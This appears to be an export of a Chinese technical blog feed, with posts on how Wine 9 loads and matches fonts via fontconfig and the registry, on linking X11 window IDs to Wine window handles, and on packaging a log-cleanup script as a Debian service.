<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Rule Set: &#x2F;etc&#x2F;fonts&#x2F;conf.d&#x2F;69-unifont.conf</span><br><span class="line"></span><br><span class="line">FcConfigSubstitute donePattern has 5 elts (size 16)</span><br><span class="line">	family: &quot;DejaVu Sans&quot;(w) &quot;Bitstream Vera Sans&quot;(w) &quot;DejaVu Sans&quot;(w) &quot;Verdana&quot;(w) &quot;Arial&quot;(w) &quot;Albany AMT&quot;(w) &quot;Luxi Sans&quot;(w) &quot;Nimbus Sans L&quot;(w) &quot;Nimbus Sans&quot;(w) &quot;Nimbus Sans&quot;(w) &quot;Helvetica&quot;(w) &quot;Nimbus Sans&quot;(w) &quot;Nimbus Sans L&quot;(w) &quot;Lucida Sans Unicode&quot;(w) &quot;BPG Glaho International&quot;(w) &quot;Tahoma&quot;(w) &quot;URW Gothic&quot;(w) &quot;Nimbus Sans&quot;(w) &quot;Nimbus Sans Narrow&quot;(w) &quot;Nachlieli&quot;(w) &quot;Lucida Sans Unicode&quot;(w) &quot;Yudit Unicode&quot;(w) &quot;Kerkis&quot;(w) &quot;ArmNet Helvetica&quot;(w) &quot;Artsounk&quot;(w) &quot;BPG UTF8 M&quot;(w) &quot;Waree&quot;(w) &quot;Loma&quot;(w) &quot;Garuda&quot;(w) &quot;Umpush&quot;(w) &quot;Saysettha Unicode&quot;(w) &quot;JG Lao Old Arial&quot;(w) &quot;GF Zemen Unicode&quot;(w) &quot;Pigiarniq&quot;(w) &quot;B Davat&quot;(w) &quot;B Compset&quot;(w) &quot;Kacst-Qr&quot;(w) &quot;Urdu Nastaliq Unicode&quot;(w) &quot;Raghindi&quot;(w) &quot;Mukti Narrow&quot;(w) &quot;padmaa&quot;(w) &quot;Hapax Berb猫re&quot;(w) &quot;MS Gothic&quot;(w) &quot;UmePlus P Gothic&quot;(w) &quot;Microsoft YaHei&quot;(w) &quot;Microsoft JhengHei&quot;(w) &quot;WenQuanYi Zen Hei&quot;(w) &quot;WenQuanYi Bitmap Song&quot;(w) &quot;AR PL ShanHeiSun Uni&quot;(w) &quot;AR PL New Sung&quot;(w) &quot;MgOpen Moderna&quot;(w) &quot;MgOpen Modata&quot;(w) &quot;MgOpen Cosmetica&quot;(w) &quot;VL Gothic&quot;(w) &quot;IPAMonaGothic&quot;(w) &quot;IPAGothic&quot;(w) &quot;Sazanami Gothic&quot;(w) &quot;Kochi Gothic&quot;(w) &quot;AR PL KaitiM GB&quot;(w) &quot;AR PL KaitiM Big5&quot;(w) &quot;AR PL ShanHeiSun Uni&quot;(w) &quot;AR PL SungtiL GB&quot;(w) &quot;AR PL Mingti2L Big5&quot;(w) &quot;锛汲 銈淬偡銉冦偗&quot;(w) &quot;ZYSong18030&quot;(w) &quot;NanumGothic&quot;(w) &quot;UnDotum&quot;(w) &quot;Baekmuk Dotum&quot;(w) &quot;Baekmuk Gulim&quot;(w) &quot;KacstQura&quot;(w) &quot;Lohit Bengali&quot;(w) &quot;Lohit Gujarati&quot;(w) &quot;Lohit Hindi&quot;(w) &quot;Lohit Marathi&quot;(w) &quot;Lohit Maithili&quot;(w) &quot;Lohit Kashmiri&quot;(w) &quot;Lohit Konkani&quot;(w) &quot;Lohit Nepali&quot;(w) &quot;Lohit Sindhi&quot;(w) &quot;Lohit Punjabi&quot;(w) &quot;Lohit Tamil&quot;(w) &quot;Meera&quot;(w) &quot;Lohit Malayalam&quot;(w) &quot;Lohit Kannada&quot;(w) &quot;Lohit Telugu&quot;(w) &quot;Lohit Oriya&quot;(w) &quot;LKLUG&quot;(w) &quot;FreeSans&quot;(w) &quot;Arial Unicode MS&quot;(w) &quot;Arial Unicode&quot;(w) &quot;Code2000&quot;(w) &quot;Code2001&quot;(w) &quot;sans-serif&quot;(w) &quot;Roya&quot;(w) &quot;Koodak&quot;(w) &quot;Terafik&quot;(w) &quot;sans-serif&quot;(w) &quot;ITC Avant Garde Gothic&quot;(w) &quot;URW Gothic&quot;(w) &quot;sans-serif&quot;(w) &quot;sans-serif&quot;(w) &quot;Helvetica&quot;(w) &quot;Helvetica Narrow&quot;(w) &quot;Nimbus Sans Narrow&quot;(w)</span><br><span class="line">	hintstyle: 1(i)(w)</span><br><span class="line">	lang: &quot;zh-CN&quot;(w)</span><br><span class="line">	lcdfilter: 1(i)(w)</span><br><span class="line">	prgname: &quot;wine-preloader&quot;(s)</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>这个是fontconfig处理后返回的五个元素，里面有重复的字体，也有好多系统上不存在的字体。 fontconfig 在 font pattern 中添加的字体，是可以不存在于系统上的。Rule Set，则是当前规则的路径，fontconfig通过这个配置文件进行对字体处理。这个信息中的family中的字体顺序，就是wine启动进程的字体匹配顺序。</li>
</ol>
<h3 id="fontconfig配置"><a href="#fontconfig配置" class="headerlink" title="fontconfig配置"></a>fontconfig配置</h3><p>fontconfig 主要读取/etc/fonts/fonts.conf，/etc/fonts/conf.d/<em>.conf， <del>/.config/fontconfig/fonts.conf，</del>/config/fontconfig/conf.d/</em>.conf，上述四个路径的配置文件顺序可以通/etc/fonts/conf.d/目录控制，我们查看其目录下50-user.conf配置文件可以发现其中的语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE fontconfig SYSTEM &quot;fonts.dtd&quot;&gt;</span><br><span class="line">&lt;fontconfig&gt;</span><br><span class="line">  &lt;its:rules xmlns:its&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2005&#x2F;11&#x2F;its&quot; version&#x3D;&quot;1.0&quot;&gt;</span><br><span class="line">    &lt;its:translateRule translate&#x3D;&quot;no&quot; selector&#x3D;&quot;&#x2F;fontconfig&#x2F;*[not(self::description)]&quot;&#x2F;&gt;</span><br><span class="line">  &lt;&#x2F;its:rules&gt;</span><br><span class="line"></span><br><span class="line">  &lt;description&gt;Load per-user customization files&lt;&#x2F;description&gt;</span><br><span class="line">	&lt;include ignore_missing&#x3D;&quot;yes&quot; prefix&#x3D;&quot;xdg&quot;&gt;fontconfig&#x2F;conf.d&lt;&#x2F;include&gt;</span><br><span class="line">	&lt;include ignore_missing&#x3D;&quot;yes&quot; prefix&#x3D;&quot;xdg&quot;&gt;fontconfig&#x2F;fonts.conf&lt;&#x2F;include&gt;</span><br><span class="line">	&lt;!-- the following elements will be removed in the future --&gt;</span><br><span class="line">	&lt;include ignore_missing&#x3D;&quot;yes&quot; deprecated&#x3D;&quot;yes&quot;&gt;~&#x2F;.fonts.conf.d&lt;&#x2F;include&gt;</span><br><span class="line">	&lt;include ignore_missing&#x3D;&quot;yes&quot; deprecated&#x3D;&quot;yes&quot;&gt;~&#x2F;.fonts.conf&lt;&#x2F;include&gt;</span><br><span class="line">&lt;&#x2F;fontconfig&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p> 语句中的属性值prefix=”xdg”，代表 XDG_CONFIG_HOME 目录，默认是我们熟悉的~/.config/目录。fontconfig 在读取家目录的配置文件后， 再接着读取完/etc/fonts/conf.d/中剩余的配置文件。</p>
<h3 id="系统字体路径存放路径"><a href="#系统字体路径存放路径" class="headerlink" title="系统字体路径存放路径"></a>系统字体路径存放路径</h3><p>目前系统的字体存放在 <code>/usr/share/fonts/</code>下面，wine字体在此目录的hotpot下。此目录是由<code>/etc/fonts/fonts.conf</code>文件控制。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;dir&gt;&#x2F;usr&#x2F;share&#x2F;fonts&lt;&#x2F;dir&gt;</span><br><span class="line">&lt;dir&gt;&#x2F;usr&#x2F;local&#x2F;share&#x2F;fonts&lt;&#x2F;dir&gt;</span><br><span class="line">&lt;dir prefix&#x3D;&quot;xdg&quot;&gt;fonts&lt;&#x2F;dir&gt;</span><br><span class="line">&lt;!-- the following element will be removed in the future --&gt;</span><br><span class="line">&lt;dir&gt;~&#x2F;.fonts&lt;&#x2F;dir&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="手动增加配置文件"><a href="#手动增加配置文件" class="headerlink" title="手动增加配置文件"></a>手动增加配置文件</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE fontconfig SYSTEM &quot;fonts.dtd&quot;&gt;</span><br><span class="line">&lt;fontconfig&gt;</span><br><span class="line">  &lt;its:rules xmlns:its&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2005&#x2F;11&#x2F;its&quot; version&#x3D;&quot;1.0&quot;&gt;</span><br><span class="line">    &lt;its:translateRule translate&#x3D;&quot;no&quot; selector&#x3D;&quot;&#x2F;fontconfig&#x2F;*[not(self::description)]&quot;&#x2F;&gt;</span><br><span class="line">  &lt;&#x2F;its:rules&gt;</span><br><span class="line"></span><br><span class="line">&lt;match target&#x3D;&quot;pattern&quot;&gt;</span><br><span class="line">	&lt;test name&#x3D;&quot;lang&quot;&gt;</span><br><span class="line">		&lt;string&gt;zh-CN&lt;&#x2F;string&gt;</span><br><span class="line">	&lt;&#x2F;test&gt;</span><br><span class="line">	&lt;edit name&#x3D;&quot;family&quot; mode&#x3D;&quot;prepend&quot; binding&#x3D;&quot;strong&quot;&gt;</span><br><span class="line">		&lt;string&gt;SimSun&lt;&#x2F;string&gt;</span><br><span class="line">	&lt;&#x2F;edit&gt;</span><br><span class="line">&lt;&#x2F;match&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;fontconfig&gt;</span><br></pre></td></tr></table></figure>

<p>增加文件100-wine.conf，存放至/etc/fonts/conf.d，此配置文件意思是当fontconfig收到元素lang为zh-CN时，优先匹配宋体，当增加此文件时记得刷新系统字体缓存<code>fc -v -f</code>,运行结束后会发现当前系统的汉字均修改为宋体。</p>
<h1 id="wine下的字体加载"><a href="#wine下的字体加载" class="headerlink" title="wine下的字体加载"></a>wine下的字体加载</h1><h2 id="wine下字体分类"><a href="#wine下字体分类" class="headerlink" title="wine下字体分类"></a>wine下字体分类</h2><ul>
<li>wine下的字体存储是根据字体的family分为一个总类，再往下细分字体的face（字体面）。例如字体中的宋体的family（标识）是：SimSun（英文名）和 宋体（中文名），其中的字体面包含：<ol>
<li>常规体（Regular）：常规的宋体字体样式，用于正常的文本显示和打印。</li>
<li>粗体（Bold）：加粗的宋体字体样式，用于强调或突出显示文本。</li>
<li>斜体（Italic）：倾斜的宋体字体样式，用于强调或以不同的视觉效果显示文本。</li>
<li>粗斜体（Bold Italic）：加粗且倾斜的宋体字体样式，常用于强调、标题或其他特殊效果。</li>
</ol>
</li>
</ul>
<h2 id="wine9字体加载流程详细分析"><a href="#wine9字体加载流程详细分析" class="headerlink" title="wine9字体加载流程详细分析"></a>wine9字体加载流程详细分析</h2><p>当前是使用wine9观察其运行逻辑，wine下的字体初始化是在win32u的 font.c 的 font_init 函数中，以下重要函数流程详细分析。</p>
<ul>
<li><p>load_system_bitmap_fonts：</p>
<ul>
<li>函数功能：读取HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Hardware Profiles\Current\Software\Fonts下的{ “FONTS.FON”, “OEMFONT.FON”, “FIXEDFON.FON” };获取字体信息。</li>
<li>关键信息：<ol>
<li>FONTS.FON: 这是 Windows 系统默认字体文件之一。它包含了用于显示系统界面和用户界面元素（如窗口标题、按钮、菜单等）的字体信息。系统使用 “FONTS.FON” 字体文件来确保在各种语言环境下都能正确显示系统界面。</li>
<li>OEMFONT.FON: “OEMFONT.FON” 是用于显示命令行界面（例如命令提示符）的字体文件。它定义了命令行窗口中使用的字符集和字体样式。</li>
<li>FIXEDFON.FON: “FIXEDFON.FON” 是另一个用于命令行界面的字体文件。它提供了终端窗口中使用的固定宽度字体，这意味着每个字符都占据相同的空间。</li>
</ol>
</li>
</ul>
</li>
<li><p>load_file_system_fonts：</p>
<ul>
<li>函数功能：读取容器下C:\windows\fonts\目录字体。</li>
<li>关键信息：<ol>
<li>get_fonts_data_dir_path：如果WINEDATADIR有值则读取环境变量WINEDATADIR下的/usr/local/share/wine /usr/local/share/wine/fonts的字体，如果WINEBUILDDIR环境变量有值则读取这个目录下的font文件。</li>
<li>加载HKEY_CURRENT_USER\Software\Wine\Fonts中配置的字体目录，hotpot下的安装字体路径就存入这里。</li>
</ol>
</li>
</ul>
</li>
<li><p>font_funcs-&gt;load_fonts：</p>
<ul>
<li>函数功能：调用的是freetype_load_fonts，这函数会调用系统下的字体初始化，例如linux就是fontconfig的加载字体函数，FcConfigGetCurrent,FcStrSetCreate，FcConfigGetFontDirs,FcDirCacheRead函数获取系统下的字体并通过add_gdi_face函数向Wine的字体系统中添加一个GDI字体，如果该字体有两个名称，则将其写入至系统中的<code>font_subst_list</code>列表，在写入过程中second_name与name是在载入中是相反的，在linux可以用命令<code>fc-list -b</code>查看同一个字体存在两个名称<code>fullname: &quot;宋体&quot;(s) &quot;SimSun&quot;(s)</code>。</li>
</ul>
</li>
<li><p>load_registry_fonts：</p>
<ul>
<li>函数功能：加载容器下注册表中 HKEY_LOCAL_MACHINE\Software\Microsoft\Windows[ NT]\CurrentVersion\Fonts字体。</li>
</ul>
</li>
<li><p>update_external_font_keys：</p>
<ul>
<li>函数功能：读取 HKEY_CURRENT_USER\Software\Microsoft\Windows[ NT]\CurrentVersion\Fonts\External Fonts下的字体并将字体中重复的路径信息进行删除，如果这个操作已经被执行了一次，则调用load_font_list_from_cache函数直接读取缓存即可，其内容是使用注册表存储字体的绝对路径。</li>
<li>关键信息：<ol>
<li>如果已经存在HKEY_CURRENT_USER\Software\Microsoft\Windows[ NT]\CurrentVersion\Fonts\External Fonts 该项则不会执行这个函数。</li>
<li>非wine自带的字体与容器下的字体均为扩展字体。</li>
<li>这里会将已经获取的字体写入注册表中HKEY_LOCAL_MACHINE\Software\Microsoft\Windows[ NT]\CurrentVersion\Fonts，与HKEY_CURRENT_USER\Software\Microsoft\Windows[ NT]\CurrentVersion\Fonts\External Fonts注册表中。</li>
<li>只会将扩展字体写入至注册表，系统自带字体（window/fonts）与wine字体内容加载至wine中，但注册表未写入。</li>
</ol>
</li>
</ul>
</li>
<li><p>load_gdi_font_subst：</p>
<ul>
<li>函数功能：读取HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\FontSubstitutes注册表的字体，如果当前左边字体不存在则用右边字体替换左边字体，将其信息写入<code>font_subst_list</code>列表中。</li>
</ul>
</li>
<li><p>load_gdi_font_replacements：</p>
<ul>
<li>函数功能：读取[HKEY_CURRENT_USER\Software\Wine\Fonts\Replacements]注册表下字体信息，也是操作字体替换的，这个注册表与上一个区别是必须被替换的字体是不存在的，否则无法替换成功。</li>
</ul>
</li>
<li><p>load_system_links：</p>
<ul>
<li>函数功能： 初始化注册表 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Fontlink 中的 systemlink 键是用于配置 Windows 系统中的字体链接（Font Linking）。在 systemlink 键下，你可以找到一系列的注册表项，每个项都对应于一个特定的字体。这些注册表项包含一个或多个字体名称，表示当特定字体不可用时，应使用哪些备用字体。</li>
<li>关键信息：<ol>
<li>MS SHELL Dlg：用于在对话框和窗口控件中显示文本，如按钮、标签、文本框等，wine下默认使用宋体，在注册表HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\FontSubstitutes中存在，winecfg的修改针对这个地方。</li>
<li>system：”System” 字体是指 Windows 操作系统中用于显示用户界面元素的默认字体。它是用于显示对话框、菜单、按钮、标签、窗口标题等各种界面组件的字体。wine下默认使用tahoma.ttf，此字体是wine自带字体，在wine进程目录中。</li>
</ol>
</li>
</ul>
</li>
</ul>
<p>使用上述函数就将系统的显示字体与替换字体加载完毕。</p>
<h1 id="wine下界面显示字体选择"><a href="#wine下界面显示字体选择" class="headerlink" title="wine下界面显示字体选择"></a>wine下界面显示字体选择</h1><ul>
<li><p>NtGdiSelectFont：</p>
<ul>
<li>函数功能：该函数用于在设备上下文 (DC, Device Context) 中选择指定的字体对象。它是 GDI 渲染流程的一部分，用于在绘图操作中定义字体的外观和行为</li>
<li>关键信息<ol>
<li>该函数传入HDC关键参数，HDC 是设备上下文句柄 (Device Context Handle) 的缩写。它是一个指向设备上下文的指针，用于在应用程序中与图形设备进行交互。HDC 用于执行绘图操作，例如绘制文本、绘制图形、位图操作等。使用 GetDC 函数可以获取一个窗口或设备的设备上下文句柄。</li>
<li>通过<code>GET_DC_PHYSDEV</code>这个宏获取关键结构图<code>PHYSDEV</code>， <code>PHYSDEV</code>是物理设备结构体 (Physical Device) 的缩写。它是一个指向物理设备结构体的指针，表示与物理设备相关的信息。在 GDI 编程中，PHYSDEV 可以用于访问和操作底层设备的特定功能。它通常用于开发自定义的设备驱动程序或扩展 GDI 功能。</li>
<li>调用<code>physdev-&gt;funcs-&gt;pSelectFont</code>函数，实际为<code>dlls/win32u</code>下的<code>font_SelectFont</code>函数，获取到<code>HFONT</code>， <code>HFONT</code>是 Windows GDI (图形设备接口) 中用于表示字体的句柄类型。它是一个指向字体对象的指针。</li>
<li>其中获取到<code>aa_flags</code>参数，其参数是要传递给GetGlyphOutline的当前字体的抗锯齿标志。</li>
</ol>
</li>
</ul>
</li>
<li><p>font_SelectFont：</p>
<ul>
<li> 函数功能：该其主要作用是在设备上下文 (Device Context, DC) 中选择一个字体，并配置与字体渲染相关的参数。这个函数是字体渲染系统的关键一环，用于从可用字体中选择最合适的字体，确保在文本绘制时正确显示。</li>
<li>关键信息<ol>
<li>dcmat： DC transform（设备上下文变换）是指对设备上下文（Device Context, DC）应用的一种变换，用于在图形设备接口 (GDI) 中控制文本和图形的缩放、旋转以及其他变换效果。</li>
<li>bitmap：在字体处理和渲染中，bitmap 是一种基于像素的字体表示方式。它与矢量字体（如 TrueType 或 OpenType）不同，bitmap 字体直接存储了每个字符在特定大小和分辨率下的像素阵列。当设置 GGO_BITMAP 参数时，表示渲染引擎会返回字符的 bitmap 表示。bitmap 在字体处理中是一种直接、高效但不灵活的表示方式。它适合在特定环境和分辨率下显示。</li>
<li>该函数中<code>关键调用select_font</code>函数，获取目标字体。</li>
</ol>
</li>
</ul>
</li>
<li><p>select_font：</p>
<ul>
<li>函数功能：根据指定的字体属性选择一个最佳匹配的字体对象。</li>
<li>关键信息<ol>
<li>facename_compare： 函数处理符号匹配的问题，暂时跳过。</li>
<li>find_cached_gdi_font：第一次调用的时候是匹配现有已经在缓存中的字体，每次一次的select_font都会把匹配字体加入缓存中，该函数的匹配成功通过<code>字符名称 lf-&gt;lfFaceName</code>，当然字体的矩阵，位图必须的一致。</li>
<li>find_matching_face：该函数为<code>关键函数</code>，其功能是根据 LOGFONTW 结构的内容（字符集与名称），找到与请求的字体属性匹配的字体。</li>
<li>垂直字体（名称以 @ 开头）：垂直字体是专门为东亚语言（如中文、日文和韩文）的垂直书写设计的字体</li>
<li>create_gdi_font：找到字体后，在创建一个font的缓存，通过<code>cache_gdi_font( font );</code>函数存入到cache中，让<code>find_cached_gdi_font</code>使用</li>
<li>create_child_font_list：该函数是通过用来为了处理无字体或者存在该字体无指定字功能的列表，当系统不存在指定字体时，wine中默认使用Microsoft Sans Serif当做回退字体，当系统存在指定字体但该字体中单一字不存在字体库中，就会通过child_font来显示（暂未找到这块函数实现）。</li>
</ol>
</li>
</ul>
</li>
<li><p>find_matching_face：</p>
<ul>
<li>函数功能：指定条件（如字体名称、字体替换、样式和字符集兼容性）最匹配的字面。</li>
<li>关键信息<ol>
<li>获取subst数据，subst为备用字体，通过<code>get_gdi_font_subst</code>函数获取，其数据通过<code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\FontSubstitutes</code>注册表与系统中字体获取，系统中的second_name与name是在载入中是相反的，在linux可以用命令<code>fc-list -b</code>查看同一个字体存在两个名称，例如系统下的宋体：<code>fullname: &quot;宋体&quot;(s) &quot;SimSun&quot;(s)</code>。</li>
<li>该函数中<code>关键调用find_matching_face_by_name</code>函数，获取目标字体。</li>
</ol>
</li>
</ul>
</li>
<li><p>find_matching_face_by_name：</p>
<ul>
<li>函数功能：根据指定的字体名称，找到最符合的字体面。</li>
<li>关键信息<ol>
<li>find_family_from_any_name：通过字体名称查询该字体的family，方案是遍历<code>family_name_tree</code>进行比对查找。<ul>
<li>family_name_tree：在字体加载时，系统会扫描注册表路径 Fonts，构建一个字体族的树状结构，该字体包含linux系统中的字体，wine自身的字体，容器中的字体。</li>
</ul>
</li>
<li>find_best_matching_face：该函数通过遍历第1步获取的字体family中所有可用的字体面，并根据计算系统中的字体面和目标字体在斜体 (italic) 和粗体 (bold) 属性上的差异，获取匹配度最高目标字体，如果该字体存在family，则通过该函数进行匹配，若能匹配成功则直接返回。</li>
<li>第三步没找到则通过循环按字体面完整名称查找，通过遍历family_name_tree，再遍历字体家族树（family_name_tree），从每个字体家族的字体面列表中查找是否存在与 name 匹配的完整字体面名称（face-&gt;full_name）。</li>
<li>can_select_face：在第3步中判断循环中找到的字体面中的字体判断是否能使用。<ul>
<li>if (!face-&gt;scalable &amp;&amp; !can_use_bitmap) return FALSE：如果字体不是矢量字体（face-&gt;scalable == FALSE），且不允许位图字体，返回FALSE。</li>
<li>if (!fs.fsCsb[0]) return TRUE：检查是否有字符集要求，果请求的字符集标志（fs.fsCsb[0]）为 0，表示没有具体字符集要求，返回 TRUE。</li>
<li>if (fs.fsCsb[0] &amp; face-&gt;fs.fsCsb[0]) return TRUE：如果字体面支持请求的字符集（通过位与运算检查），返回 TRUE。</li>
<li>find_gdi_font_link( face-&gt;family-&gt;family_name )：看一下是否有替代的字体，替代字体通过<code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Fontlink</code>查找。</li>
</ul>
</li>
<li>find_family_from_font_links：如果通过 2,3 步骤没找到合适的字体，则比对传入的字体名称、<code>subst</code>字体名称与系统字体(HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Fontlink)是否能匹配上，找到其对应的字体家族，从该字体家族中调用<code>find_best_matching_face</code>，找到最匹配的字体。</li>
</ol>
</li>
</ul>
</li>
</ul>
<h1 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h1><ol>
<li>wine下的字体加载修改wine的config配置文件是否有效果？<ul>
<li>wine下的文字是通过自己的逻辑进行加载匹配，不使用fontconfig所以就不生效。</li>
</ul>
</li>
<li>wine 自身使用fontconfig的api了吗<ul>
<li>使用了。</li>
</ul>
</li>
<li>wine下fontconfig的api会走配置文件吗<ul>
<li>wine下match逻辑是不是(加载-&gt;通过api进行match)不走配置文件。</li>
</ul>
</li>
<li>fc-match的匹配与wine的匹配逻辑一致吗？<ul>
<li>fc-match是会走配置文件的，GTK 程序、Qt 程序、虚拟终端的配置文件中 设置它们使用的字体，和设置 fontconfig 的配置文件是两码事，在使用api或者上层界面程序配置字体时可以选择兼容当前系统配置或者不使用当前系统的fontconfig,若双方设置冲突则遵循上层api配置。</li>
</ul>
</li>
<li>容器内window/fonts/下字体有但是没有写入注册表？<ul>
<li>是的，会在update_external_font_keys函数进行处理。</li>
</ul>
</li>
<li>在应用中如果存在两份宋体，其中一份宋体中存在应用所需要的字体，wine下如何处理加载的？<ul>
<li>按照顺序加载第一份，与是否缺字无关。</li>
</ul>
</li>
<li>在记事本中为什么输入文字为宋体？<ul>
<li>由记事本中设置的字体控制，当设置为宋体后无论输入法输入或外部复制粘贴，记事本中均为宋体。</li>
</ul>
</li>
<li>wine下是如何找到应用所需要的目标字体？<ul>
<li><ol>
<li>从缓存中查找，命中则返回。</li>
</ol>
</li>
<li><ol start="2">
<li>先获取字体的家族，在从该字体家族中通过wine自身的字体评分，找到最匹配的字体面，命中则返回。</li>
</ol>
</li>
<li><ol start="3">
<li>与第2步一样，但是从获取的备用字体的字体家族，命中则返回。</li>
</ol>
</li>
<li><ol start="3">
<li>与已加载字体开始比对字体面完整名称，命中则返回。</li>
</ol>
</li>
<li><ol start="4">
<li>对传入的字体名称、<code>subst</code>字体名称与系统字体、热门字体进行字体名称进行比对，命中则返回。</li>
</ol>
</li>
<li><ol start="5">
<li>返回NULL，显示方框。</li>
</ol>
</li>
</ul>
</li>
<li>应用中设置使用宋体，但是宋体无目标生僻字，其他字体有所需要生僻字，wine下如何处理？<ul>
<li>如果字体是同一份文件，仅是多了某些字体，那么按照字体加载顺序选第一份文件。</li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>wine</category>
      </categories>
      <tags>
        <tag>wine</tag>
      </tags>
  </entry>
  <entry>
    <title>【Linux技术分享】将x11窗口创建与window句柄关联</title>
    <url>/2024/12/12/wine-%E5%B0%86x11%E7%AA%97%E5%8F%A3%E5%88%9B%E5%BB%BA%E4%B8%8Ewindow%E5%8F%A5%E6%9F%84%E5%85%B3%E8%81%94/</url>
    <content><![CDATA[<h1 id="将x11窗口创建与window句柄关联"><a href="#将x11窗口创建与window句柄关联" class="headerlink" title="将x11窗口创建与window句柄关联"></a>将x11窗口创建与window句柄关联</h1><span id="more"></span>
<h2 id="问题概述"><a href="#问题概述" class="headerlink" title="问题概述"></a>问题概述</h2><p>wine下窗口创建是通过window下的<code>createwindow创建-&gt;调用x11的xcreatewindow</code>流程，在linux下有很多观察窗口的工具，如何将x11下的<code>window id</code>与wine下窗口进行关联？</p>
<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><ol>
<li>wine启动一个notepad窗口，通过<code>xwininfo</code>获取到窗口的id<br><img src="/2024/12/12/wine-%E5%B0%86x11%E7%AA%97%E5%8F%A3%E5%88%9B%E5%BB%BA%E4%B8%8Ewindow%E5%8F%A5%E6%9F%84%E5%85%B3%E8%81%94/1.png" alt="图1"></li>
<li>学习wine源码发现wine中窗口创建是在winex11.drv模块下，准确来说是在该模块的<code>window.c</code>函数中</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!(cx = data-&gt;whole_rect.right - data-&gt;whole_rect.left)) cx = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (cx &gt; <span class="number">65535</span>) cx = <span class="number">65535</span>;</span><br><span class="line"><span class="keyword">if</span> (!(cy = data-&gt;whole_rect.bottom - data-&gt;whole_rect.top)) cy = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (cy &gt; <span class="number">65535</span>) cy = <span class="number">65535</span>;</span><br><span class="line"></span><br><span class="line">pos = virtual_screen_to_root( data-&gt;whole_rect.left, data-&gt;whole_rect.top );</span><br><span class="line">data-&gt;whole_window = XCreateWindow( data-&gt;display, root_window, pos.x, pos.y,</span><br><span class="line">                                    cx, cy, <span class="number">0</span>, data-&gt;vis.depth, InputOutput,</span><br><span class="line">                                    data-&gt;vis.visual, mask, &amp;attr );</span><br><span class="line"><span class="keyword">if</span> (!data-&gt;whole_window) <span class="keyword">goto</span> done;</span><br><span class="line"></span><br><span class="line">set_initial_wm_hints( data-&gt;display, data-&gt;whole_window );</span><br><span class="line">set_wm_hints( data );</span><br></pre></td></tr></table></figure>

<ol start="3">
<li><p><code>XCreateWindow</code>窗口创建返回<code>data-&gt;whole_window</code>的值为窗口创建后的窗口id,通过第一步会发现与该值一致。</p>
</li>
<li><p>通过源码学习该函数下面使用<code>XSaveContext( data-&gt;display, data-&gt;whole_window, winContext, (char *)data-&gt;hwnd );</code>函数，将窗口x11创建的id与window下的hwnd进行关联</p>
</li>
<li><p>通过打印<code>WIN_CreateWindowEx</code>函数创建的句柄，发现就是该窗口</p>
</li>
</ol>
]]></content>
      <categories>
        <category>wine</category>
      </categories>
      <tags>
        <tag>wine</tag>
      </tags>
  </entry>
  <entry>
    <title>【Linux技术分享】将简易脚本转换为服务文件并打包</title>
    <url>/2024/11/20/%E5%B0%86%E7%AE%80%E6%98%93%E8%84%9A%E6%9C%AC%E8%BD%AC%E6%8D%A2%E4%B8%BA%E6%9C%8D%E5%8A%A1%E6%96%87%E4%BB%B6%E5%B9%B6%E6%89%93%E5%8C%85/</url>
    <content><![CDATA[<h1 id="将简易脚本转换为服务文件并打包"><a href="#将简易脚本转换为服务文件并打包" class="headerlink" title="将简易脚本转换为服务文件并打包"></a>将简易脚本转换为服务文件并打包</h1><p><em><strong>使用debian+makefile将脚本实现为服务文件，并进行打包，<a href="https://github.com/lk-me/nfs-clean-log">代码地址</a>。</strong></em></p>
<span id="more"></span>

<h1 id="nfs-clean-log"><a href="#nfs-clean-log" class="headerlink" title="nfs-clean-log"></a>nfs-clean-log</h1><pre><code>`nfs-clean-log`为简易程序，将一个删除日志缓存的批处理文件脚本使用服务进行便捷启动，并增加将其用debian的contral控制打包。
</code></pre>
<h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><ul>
<li>重启后删除 /var/cache/apt/archives/*.deb，/var/crash/*，/var/log/journal/*文件</li>
</ul>
<h3 id="debian-ubuntu"><a href="#debian-ubuntu" class="headerlink" title="/debian/ubuntu"></a>/debian/ubuntu</h3><ul>
<li> sudo dpkg-buildpackage -us -uc -b</li>
</ul>
<h3 id="todo"><a href="#todo" class="headerlink" title="todo"></a>todo</h3><ul>
<li>对文件判断，并补充脚本功能</li>
</ul>
]]></content>
      <categories>
        <category>C++</category>
      </categories>
      <tags>
        <tag>Linux技术分享</tag>
      </tags>
  </entry>
  <entry>
    <title>【Linux技术分享】ida修改dll并进行保存</title>
    <url>/2024/08/26/wine-IDA%E4%BF%AE%E6%94%B9dll%E6%96%87%E4%BB%B6/</url>
